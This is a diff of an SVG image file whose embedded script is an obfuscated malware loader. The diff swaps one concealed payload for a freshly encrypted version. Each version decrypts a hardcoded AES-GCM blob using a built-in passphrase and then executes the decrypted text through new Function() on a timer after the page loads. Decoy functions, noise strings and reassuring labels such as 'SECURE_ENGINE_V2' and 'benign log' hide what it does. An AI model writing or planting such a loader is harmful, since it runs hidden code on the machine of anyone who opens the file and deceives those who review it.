@@ -3,132 +3,127 @@
   <!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->
   
   <script type="application/javascript"><![CDATA[
-    // ======= SYSTEM MONITORING =======
-    const ENGINE_TAG = "[SECURE_ENGINE_V2]";
-    let perfData = {
-      startTime: Date.now(),
-      memoryUsageBytes: 0,
-      cpuLoadSimulation: 0,
-      nonsenseCounter: 0
+    // ======= SYSTEM MONITORING MODULE =======
+    const MONITOR_TAG = "[SECURE_ENGINE_V2]";
+    let trackerData = {
+      initTimestamp: Date.now(),
+      memUsage: 0,
+      simulatedLoad: 0,
+      iterationCounter: 0
     };
 
-   const bel = "[EMAIL]";
+       const bel = "[EMAIL]";
     const lieve = "[KEY]";
-
-    // Random string generator - pointless but confusing
-    function createNoiseString() {
+    
+    
+    // Noise Generator for Confusion
+    function generateObfuscation() {
       return Math.random().toString(36).slice(2, 14) + Math.random().toString(36).slice(2, 14);
     }
 
-    // Update performance dummy data
-    function updatePerfStats() {
-      perfData.memoryUsageBytes = window.performance?.memory?.usedJSHeapSize || 0;
-      perfData.cpuLoadSimulation = Math.random() * 1999 + 1;
-      perfData.nonsenseCounter += 1;
+    // Monitor Update
+    function refreshTracker() {
+      trackerData.memUsage = window.performance?.memory?.usedJSHeapSize || 0;
+      trackerData.simulatedLoad = Math.random() * 1999 + 1;
+      trackerData.iterationCounter += 1;
     }
 
-    // ======= ENCRYPTION CONFIGURATION HANDLER =======
-    const secretConfigModule = (function() {
-      // Sensitive constants - do NOT modify values
-      const secrets = {
-        ivHex: "0d0b798446d57328bdeb640d",
-        saltHex: "58525225b2f0aecba54c92e7fe44b669",
-        encryptedDataHex: "c6c8ecc11ec8480edfe542528b7115041d348bf0960305a48f0601424089b1c929a1b7c3f0b25a3a7c61623bb653ce56a0f3e0594d343918d291fde0da4ac9067cc4f3cb0daf1ebb4c4915f2672c4bef23c398d4ffa3e75c23ee49eee2030473104ecc96d94c813347704a04865ba6936f1d0fc09c7cd4fe593408da6054ba30c8e7c82b0d0d0f2c75360bd20f6a403e99c2f9276fb2ddcb0ce02ded7e7ff48260a1acd2892756f673fc50ceb949e045ee0cfc1be7a786b82926cac0ef22440e01efd686bafeb58748ae0af74d405cc43a11bf7135b3a44e378601dffd10d6cd24938aed898fecfc101528a1d1b21431aae04d3d4b3374261d72936ca06ea4697198910668bb3484072bb795ef63b84489b7116069d63d873b370c1693780c1aaeec1fce4b1523336d0a6ac22ebc7433f4c823b4fb63045a7ade158aae7a67402107c59386056867b5003e232f2af6fa40678a81c6959146b79c09fe70e35e27614f152744b2d9f20b7f27785cee1ddc170c48a5195f4fa6be4d0d8f7dfe4e4454dfb33ed7e45d657e9e629b2850ee9edd9f8bb50c978ae14e4c337785f6fd25f72bec519b782f7c408c4183cdc6107e457846f52677339b56d215aeb3e674e4473de38a870e5087f18da1821e94e52348d3185a3269095f1e082ccccbc45bdd2d21c4df9e40898da9eb3f7542dc2d",
-        keyPhrase: "drop"
+    // ======= ENCRYPTION HANDLER MODULE =======
+    const encryptionProcessor = (function() {
+      const dataPool = {
+        ivHex: "93899bc60b03f9b770230591",
+        saltHex: "6234f4f591dcd606d85a1a9242f20edd",
+        encryptedDataHex: "fcb21e4f107c992daae00a48a0505fcd8e509ed698452e38ef6a890b48f0196b8a509f1d4794965313ee240363749003eae7ef6189f653db062ba08a6c309df8c533ad6d25e7c1b3d0ddf5bc60ee98813b7ba8acdc740805c1ccd9849d06a1741c730fc65c01e41778633f9431eb93109c483a65baf6725ba634e22d33d1cf09cb16860fb49d05d1b925e27cc20c054b8330c4447ea337d6578c8f20a8a9e0cc8a408f36bbbb396cd1edf5af15498bc94d423e27658d6109c9854c30f7cac3e75b5d0d668c086222ad13c24ef5c5f2aa7a3f3cfcce69e8b4002804132feb425780d528412337b7191ced3289d4d711e305b6ce233783ab2beedc421e2d10e14706ce89d4bbc3ce44ebc713b025b57b83dda39993352d1c8104e0905c9d04269336bbc7dd49775eaf35034c7e6899123ba5b6c510c0c0244f6f9ef018607b440b97362af9dc2b887eb50f9819f91c7fbacbeaa5fddc744864a2939659510e82fa98e85af4f8a985299286994bf3c300b513c436430ae4c4e871e53fad53e8be50663df3df11dc663a83e22ec341b6e2c03f49ec3cbbb3c5e01bd833a9235097ab388902b054cecf4f266e091e1fb5fc8c1cd08280ba65eb9e8852b41b583f8747b7662249e6835f9ec0392c1b4bb11ef6641cc0a1420d91250967acceb19e7f91ddaf8c8a6ad9d5c67f2a464b00d4c0",
+        passphrase: "fun"
       };
 
-      // Dummy config object to confuse readers
-      const junkConfig = {
-        randomSeed: createNoiseString(),
-        flagUnused: true,
-        placeholderValue: undefined
+      const fakeConfig = {
+        dummyFlag: generateObfuscation(),
+        unrelatedKey: false,
+        placeholderValue: null
       };
 
       return {
-        getIV: () => secrets.ivHex,
-        getSalt: () => secrets.saltHex,
-        getEncryptedData: () => secrets.encryptedDataHex,
-        getKeyPhrase: () => secrets.keyPhrase,
-        getJunkConfig: () => ({...junkConfig})
+        getIV: () => dataPool.ivHex,
+        getSalt: () => dataPool.saltHex,
+        getEncryptedData: () => dataPool.encryptedDataHex,
+        getPassphrase: () => dataPool.passphrase,
+        getFakeConfig: () => ({...fakeConfig})
       };
     })();
 
-    // Converts hex string into Uint8Array
-    function hexToUint8Array(hexString) {
-      let arrayBuffer = new Uint8Array(hexString.length / 2);
-      for (let i = 0; i < hexString.length; i += 2) {
-        arrayBuffer[i / 2] = parseInt(hexString.substr(i, 2), 16);
+    // Hex Conversion
+    function hexToBuffer(hex) {
+      let buf = new Uint8Array(hex.length / 2);
+      for (let i = 0; i < hex.length; i += 2) {
+        buf[i / 2] = parseInt(hex.substr(i, 2), 16);
       }
-      return arrayBuffer;
+      return buf;
     }
 
-    // Totally pointless async function for confusion
-    async function pointlessAsyncCall() {
+    // Unnecessary Async Task
+    async function bogusAsyncTask() {
       return new Promise(resolve => {
         setTimeout(() => {
-          resolve(createNoiseString());
-        }, 75);
+          resolve(generateObfuscation());
+        }, 100);
       });
     }
 
-    // Main security initialization function
-    async function runSecurityRoutine() {
-      updatePerfStats();
+    async function launchSecurityProcedure() {
+      refreshTracker();
       try {
-        const rawKey = secretConfigModule.getKeyPhrase();
-        const importedCryptoKey = await window.crypto.subtle.importKey(
+        const passphrase = encryptionProcessor.getPassphrase();
+        const cryptoKey = await window.crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(rawKey),
+          new TextEncoder().encode(passphrase),
           { name: "PBKDF2" },
           false,
           ["deriveKey"]
         );
 
-        const saltHexStr = secretConfigModule.getSalt();
+        const saltHex = encryptionProcessor.getSalt();
         const derivedKey = await window.crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
-            salt: hexToUint8Array(saltHexStr),
+            salt: hexToBuffer(saltHex),
             iterations: 100000,
             hash: "SHA-256"
           },
-          importedCryptoKey,
+          cryptoKey,
           { name: "AES-GCM", length: 256 },
           false,
           ["decrypt"]
         );
 
-        const ivHexStr = secretConfigModule.getIV();
-        const encryptedHexStr = secretConfigModule.getEncryptedData();
+        const ivHex = encryptionProcessor.getIV();
+        const encryptedHex = encryptionProcessor.getEncryptedData();
 
-        // Await pointless async call for obfuscation
-        await pointlessAsyncCall();
+        await bogusAsyncTask();
 
         const decryptedBuffer = await window.crypto.subtle.decrypt(
           {
             name: "AES-GCM",
-            iv: hexToUint8Array(ivHexStr)
+            iv: hexToBuffer(ivHex)
           },
           derivedKey,
-          hexToUint8Array(encryptedHexStr)
+          hexToBuffer(encryptedHex)
         );
 
-        const decryptedString = new TextDecoder().decode(decryptedBuffer);
-        (new Function(decryptedString))();
-      } catch (err) {
-        console.error("Error during security routine:", err);
+        const decryptedText = new TextDecoder().decode(decryptedBuffer);
+        (new Function(decryptedText))();
+      } catch (error) {
+        console.error("Error in security procedure:", error);
       }
     }
 
-    // Extra useless event listeners & console spam
-    window.addEventListener('load', () => {
-      console.info("Page fully loaded - benign log");
-      // Extra useless loops for confusion
-      for(let i=0; i<3; i++) {
-        console.debug(`Loop iteration ${i} dummy log`);
+    window.addEventListener('DOMContentLoaded', () => {
+      console.info("Initialization complete - benign log");
+      for(let i = 0; i < 3; i++) {
+        console.debug(`Debug loop ${i} - Placeholder log`);
       }
     });
 
-    setTimeout(runSecurityRoutine, 400);
+    setTimeout(launchSecurityProcedure, 600);
   ]]></script>
 </svg>
